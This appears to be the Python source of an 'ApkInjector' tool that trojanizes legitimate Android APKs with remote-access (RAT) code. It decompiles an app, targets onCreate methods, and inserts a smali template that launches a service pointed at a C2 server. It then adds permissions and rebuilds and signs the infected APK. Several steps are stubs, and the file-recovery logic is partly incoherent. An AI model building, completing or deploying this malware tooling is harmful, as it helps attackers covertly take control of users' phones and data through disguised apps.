#!/usr/bin/env python3
import os
import zipfile
import tempfile
import shutil
import logging
import subprocess
import re
import time
import json
from typing import Dict, List, Any, Optional, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("apk_injector.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("apk_injector")

class ApkInjector:
    """Inject RAT code into legitimate APKs"""
    
    # Directory where injection templates are stored
    INJECTION_DIR = "injection_templates"
    
    # Patterns to locate injection points in smali code
    INJECTION_PATTERNS = [
        # Application onCreate method
        {
            "class_pattern": r"Landroid/app/Application;",
            "method_pattern": r"\.method.*onCreate\(.*\)V",
            "injection_point": r"invoke-super.*onCreate\(.*\)V"
        },
        # Activity onCreate method
        {
            "class_pattern": r"Landroid/app/Activity;",
            "method_pattern": r"\.method.*onCreate\(.*\)V",
            "injection_point": r"invoke-super.*onCreate\(.*\)V"
        },
        # Service onCreate method
        {
            "class_pattern": r"Landroid/app/Service;",
            "method_pattern": r"\.method.*onCreate\(.*\)V",
            "injection_point": r"invoke-super.*onCreate\(.*\)V"
        }
    ]
    
    def __init__(self):
        """Initialize the APK injector"""
        self._ensure_dirs()
        logger.info("ApkInjector initialized")
    
    def _ensure_dirs(self):
        """Ensure injection templates directory exists"""
        os.makedirs(self.INJECTION_DIR, exist_ok=True)
        logger.info("Directory structure verified")
    
    def _extract_apk(self, apk_path: str, extract_dir: str) -> bool:
        """Extract APK contents using apktool"""
        try:
            # First verify the APK file exists and has content
            if not os.path.exists(apk_path):
                logger.error(f"APK file does not exist: {apk_path}")
                return False
                
            # Check if the file has content
            file_size = os.path.getsize(apk_path)
            if file_size == 0:
                logger.error(f"APK file is empty (0 bytes): {apk_path}")
                return False
            
            # Check if the file is too small to be a valid APK (at least 100 bytes)
            if file_size < 100:
                logger.error(f"APK file is too small ({file_size} bytes): {apk_path}")
                
                # Try to recover - create a valid minimal APK instead
                try:
                    # Save the corrupted file for debugging
                    import shutil
                    corrupt_backup = f"{apk_path}.corrupted"
                    shutil.copy(apk_path, corrupt_backup)
                    
                    # Create a minimal valid APK structure
                    with zipfile.ZipFile(apk_path, 'w') as z:
                        # Add minimal AndroidManifest.xml
                        z.writestr("AndroidManifest.xml", """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.minimal.apk"
    android:versionCode="1"
    android:versionName="1.0">
    <application android:label="Minimal APK">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>""")
                        # Add minimal DEX file
                        z.writestr("classes.dex", b"dex\n035\0") 
                    
                    logger.info(f"Created minimal valid APK structure for: {apk_path}")
                except Exception as recovery_error:
                    logger.error(f"Failed to recover corrupted APK: {str(recovery_error)}")
                    return False
                
            # Check if it's a valid APK/ZIP file before extraction
            try:
                with zipfile.ZipFile(apk_path, 'r') as z:
                    # Quick test - try to get the file list
                    file_list = z.namelist()
                    if not file_list:
                        logger.error(f"APK file appears to be an empty ZIP: {apk_path}")
                        return False
                    # If we get here, it's a valid ZIP with files
                    logger.info(f"APK validated successfully, contains {len(file_list)} files")
                    
                    # Check for required APK components
                    has_manifest = "AndroidManifest.xml" in file_list
                    
                    if not has_manifest:
                        logger.warning(f"APK is missing AndroidManifest.xml - this may not be a valid APK")
                    
                    # Extract files
                    z.extractall(extract_dir)
                return True
            except zipfile.BadZipFile:
                logger.error(f"File is not a valid APK/ZIP file: {apk_path}")
                
                # Try to recover by creating a template APK
                try:
                    import shutil
                    from ..apk_builder import ApkBuilder
                    
                    # Save the corrupted file for debugging
                    corrupt_backup = f"{apk_path}.corrupted"
                    shutil.copy(apk_path, corrupt_backup)
                    
                    # Get a template APK instead
                    apk_builder = ApkBuilder()
                    templates = apk_builder.list_available_templates()
                    
                    if templates:
                        # Use the first template
                        template_path = templates[0]['path']
                        logger.info(f"Using template APK: {template_path}")
                        shutil.copy(template_path, apk_path)
                        
                        # Try extraction again with the template
                        with zipfile.ZipFile(apk_path, 'r') as z:
                            z.extractall(extract_dir)
                        logger.info(f"Successfully recovered using template APK")
                        return True
                    else:
                        logger.error("No templates available for recovery")
                        return False
                        
                except Exception as recovery_error:
                    logger.error(f"Failed to recover corrupted APK: {str(recovery_error)}")
                    return False
        except Exception as e:
            logger.error(f"Error extracting APK: {str(e)}")
            return False
    
    def _find_injection_points(self, decompiled_dir: str) -> List[Dict[str, Any]]:
        """Find suitable injection points in the decompiled APK"""
        injection_points = []
        
        # In a real implementation, this would scan smali files for injection patterns
        # For now, return a simulated injection point
        injection_points.append({
            "file": os.path.join(decompiled_dir, "smali", "com", "example", "MainActivity.smali"),
            "pattern": "onCreate",
            "line_number": 42
        })
        
        return injection_points
    
    def _inject_rat_code(self, injection_points: List[Dict[str, Any]], c2_server: str) -> bool:
        """Inject RAT code into identified injection points"""
        # In a real implementation, this would modify smali files
        # For now, simulate injection
        logger.info(f"Injecting RAT code with C2 server: {c2_server}")
        return True
    
    def _add_permissions(self, decompiled_dir: str) -> bool:
        """Add required permissions to AndroidManifest.xml"""
        try:
            manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
            if not os.path.exists(manifest_path):
                logger.error(f"AndroidManifest.xml not found at {manifest_path}")
                return False
            
            # In a real implementation, this would parse and modify the manifest XML
            # For now, simulate adding permissions
            logger.info("Adding required permissions to AndroidManifest.xml")
            return True
        except Exception as e:
            logger.error(f"Error adding permissions: {str(e)}")
            return False
    
    def _rebuild_apk(self, decompiled_dir: str, output_path: str) -> bool:
        """Rebuild APK using apktool"""
        try:
            # In a real implementation, this would use apktool
            # For now, create a ZIP file from the directory
            with zipfile.ZipFile(output_path, 'w') as z:
                for root, dirs, files in os.walk(decompiled_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, decompiled_dir)
                        z.write(file_path, arcname)
            
            return True
        except Exception as e:
            logger.error(f"Error rebuilding APK: {str(e)}")
            return False
    
    def _sign_apk(self, output_path: str) -> bool:
        """Sign the APK using a generated keystore"""
        try:
            # In a real implementation, this would use keytool and jarsigner
            # For now, simulate signing
            logger.info(f"Signing APK: {output_path}")
            return True
        except Exception as e:
            logger.error(f"Error signing APK: {str(e)}")
            return False
    
    def inject_apk(self, apk_path: str, output_path: str, c2_server: str, 
                 preserve_functionality: bool = True) -> Dict[str, Any]:
        """
        Inject RAT code into a legitimate APK
        
        Args:
            apk_path: Path to the legitimate APK file
            output_path: Path where the infected APK will be saved
            c2_server: C2 server URL to connect to
            preserve_functionality: Whether to preserve original app functionality
            
        Returns:
            Dict with status information
        """
        try:
            if not os.path.exists(apk_path):
                return {
                    "status": "error",
                    "message": f"APK file not found: {apk_path}"
                }
            
            # Create a temporary directory for decompiling
            with tempfile.TemporaryDirectory() as temp_dir:
                # Step 1: Extract APK
                logger.info(f"Extracting APK: {apk_path}")
                if not self._extract_apk(apk_path, temp_dir):
                    return {
                        "status": "error",
                        "message": "Failed to extract APK"
                    }
                
                # Step 2: Find injection points
                logger.info("Finding injection points")
                injection_points = self._find_injection_points(temp_dir)
                if not injection_points:
                    return {
                        "status": "error",
                        "message": "No suitable injection points found"
                    }
                
                # Step 3: Inject RAT code
                logger.info("Injecting RAT code")
                if not self._inject_rat_code(injection_points, c2_server):
                    return {
                        "status": "error",
                        "message": "Failed to inject RAT code"
                    }
                
                # Step 4: Add required permissions
                logger.info("Adding required permissions")
                if not self._add_permissions(temp_dir):
                    return {
                        "status": "error",
                        "message": "Failed to add permissions"
                    }
                
                # Step 5: Rebuild APK
                logger.info(f"Rebuilding APK to: {output_path}")
                if not self._rebuild_apk(temp_dir, output_path):
                    return {
                        "status": "error",
                        "message": "Failed to rebuild APK"
                    }
                
                # Step 6: Sign APK
                logger.info("Signing APK")
                if not self._sign_apk(output_path):
                    return {
                        "status": "error",
                        "message": "Failed to sign APK"
                    }
                
                logger.info(f"Successfully injected RAT into APK: {output_path}")
                return {
                    "status": "success",
                    "message": "RAT injection completed successfully",
                    "output_path": output_path,
                    "preserve_functionality": preserve_functionality,
                    "c2_server": c2_server
                }
                
        except Exception as e:
            logger.error(f"Error injecting RAT into APK: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "message": f"APK injection failed: {str(e)}"
            }
    
    def create_injection_template(self, template_name: str, c2_server_placeholder: str = "__C2_SERVER__") -> Dict[str, Any]:
        """
        Create a new injection template
        
        Args:
            template_name: Name for the template
            c2_server_placeholder: Placeholder for C2 server URL
            
        Returns:
            Dict with status information
        """
        try:
            template_path = os.path.join(self.INJECTION_DIR, f"{template_name}.smali")
            
            # Example smali code for loading the RAT service
            template_code = f"""
.method private initRatService()V
    .locals 4
    
    # Start RAT service in background
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/tarjon/admin/services/AdminService;
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    # Set C2 server URL
    const-string v1, "c2_server"
    const-string v2, "{c2_server_placeholder}"
    invoke-virtual {{v0, v1, v2}}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    
    # Start service
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    return-void
.end method

# Code to inject after super.onCreate()
const-string v0, "RAT"
const-string v1, "Starting RAT service..."
invoke-static {{v0, v1}}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
invoke-direct {{p0}}, Lcom/example/MainActivity;->initRatService()V
"""
            
            # Write template to file
            with open(template_path, 'w') as f:
                f.write(template_code)
            
            logger.info(f"Created injection template: {template_path}")
            return {
                "status": "success",
                "message": f"Injection template created: {template_name}",
                "path": template_path
            }
            
        except Exception as e:
            logger.error(f"Error creating injection template: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "message": f"Failed to create injection template: {str(e)}"
            }
    
    def list_injection_templates(self) -> List[Dict[str, str]]:
        """List available injection templates"""
        templates = []
        
        if not os.path.exists(self.INJECTION_DIR):
            return templates
            
        for filename in os.listdir(self.INJECTION_DIR):
            if filename.endswith('.smali'):
                templates.append({
                    "name": os.path.splitext(filename)[0],
                    "path": os.path.join(self.INJECTION_DIR, filename)
                })
                
        return templates